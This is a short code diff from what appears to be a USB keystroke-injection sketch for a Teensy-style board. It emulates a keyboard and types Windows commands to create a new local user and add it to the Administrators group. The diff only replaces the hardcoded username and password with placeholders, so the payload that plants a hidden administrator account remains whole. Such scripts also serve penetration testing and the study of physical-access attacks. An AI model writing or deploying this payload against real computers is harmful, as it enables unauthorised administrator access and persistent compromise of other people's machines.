@@ -43,14 +43,14 @@ void setup()
   Keyboard.send_now();
 
   delay(1000);
-  Keyboard.print("net user /add Security S3CUR1TY!");
+  Keyboard.print("net user /add [username] [password]");
   Keyboard.set_key1(KEY_ENTER);
   Keyboard.send_now();
   Keyboard.set_key1(0);
   Keyboard.send_now();
 
   delay(1000);
-  Keyboard.print("net localgroup administrators Security /add");
+  Keyboard.print("net localgroup administrators [username] /add");
   Keyboard.set_key1(KEY_ENTER);
   Keyboard.send_now();
   Keyboard.set_key1(0);
